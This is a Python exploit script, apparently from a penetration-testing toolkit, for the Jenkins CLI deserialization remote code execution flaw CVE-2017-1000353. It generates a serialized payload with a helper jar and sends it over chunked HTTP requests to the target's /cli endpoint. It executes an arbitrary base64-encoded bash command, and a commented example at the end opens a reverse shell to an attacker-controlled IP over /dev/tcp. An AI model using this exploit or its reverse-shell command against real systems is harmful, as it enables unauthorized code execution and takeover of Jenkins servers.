#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Time       : 2023/4/17 11:56
# Author     : yunkong
# FileName   : cve_2017_1000353_cmd.py
# Description:
#
# Exploit Title: Jenkins-CI 远程代码执行漏洞（CVE-2017-1000353）
# Version: Jenkins Version <=2.56; Jenkins LTS Version <= 2.46.1
# CVE: CVE-2017-1000353
import base64
import os
from subprocess import check_output
import requests
import uuid
import threading
import time

JAR_DEFAULT_PATHS = ['../../../public_lib/CVE-2017-1000353-1.1-SNAPSHOT-all.jar']


def download(url, session, proxies):
    headers = {'Side': 'download', 'Content-type': 'application/x-www-form-urlencoded', 'Session': session,
               'Transfer-Encoding': 'chunked'}
    r = requests.post(url, data=null_payload(), headers=headers, proxies=proxies, stream=True, verify=False).content
    # print(r.content)


def upload(url, session, data, proxies):
    headers = {'Side': 'upload', 'Session': session, 'Content-type': 'application/octet-stream',
               'Accept-Encoding': None}
    r = requests.post(url, data=data, headers=headers, proxies=proxies, verify=False)


def upload_chunked(url, session, data, proxies):
    headers = {'Side': 'upload', 'Session': session, 'Content-type': 'application/octet-stream',
               'Accept-Encoding': None, 'Transfer-Encoding': 'chunked', 'Cache-Control': 'no-cache'}
    r = requests.post(url, headers=headers, data=create_payload_chunked(data), proxies=proxies, verify=False)


def null_payload():
    yield b" "


def create_payload(file_path):
    with open(file_path, "rb") as f:
        FILE_SER = f.read()
    PREAMLE = b'<===[JENKINS REMOTING CAPACITY]===>rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4='
    PROTO = b'\x00\x00\x00\x00'
    payload = PREAMLE + PROTO + FILE_SER
    return payload


def create_payload_chunked(data):
    PREAMLE = b'<===[JENKINS REMOTING CAPACITY]===>rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4='
    PROTO = b'\x00\x00\x00\x00'
    yield PREAMLE
    yield PROTO
    yield data


def send_bytecode(url, file_path):
    proxies = {
        # 'http': 'http://127.0.0.1:8085',
        # 'https': 'http://127.0.0.1:8090',
    }
    URL = f"{url}/cli"
    session = str(uuid.uuid4())

    t = threading.Thread(target=download, args=(URL, session, proxies))
    t.start()

    time.sleep(2)
    # print("pwn")
    # upload(URL, session, create_payload(file_path), proxies)

    with open(file_path, 'rb') as f:
        data = f.read()
        upload_chunked(URL, session, data, proxies)


def exploit(target_url, command, jar_path=None):
    # 将command进行Base64编码
    bytes_string = command.encode('utf-8')
    encoded_bytes = base64.b64encode(bytes_string)
    command = encoded_bytes.decode('utf-8')

    if not jar_path:
        for path in JAR_DEFAULT_PATHS:
            if os.path.exists(path):
                jar_path = path

    # 生成字节码文件jenkins_poc.ser
    try:
        check_output(['java', '-jar', jar_path, 'jenkins_poc.ser', "bash -c {echo,%s}|{base64,-d}|{bash,-i}" % command])
        print("[+] The bytecode file was generated successfully.")
    except:
        print("[-] The bytecode file was generated unsuccessfully.")
        return False

    # 将刚才生成的字节码文件发送给目标
    try:
        send_bytecode(target_url, "./jenkins_poc.ser")
        print("[+] The bytecode file was sent successfully.")
        os.remove("./jenkins_poc.ser")
        return True
    except:
        print("[-] The bytecode file was sent unsuccessfully.")
        os.remove("./jenkins_poc.ser")
        return False


# exploit("http://192.168.12.130:8080", "bash -i >& /dev/tcp/192.168.12.152/5555 0>&1")
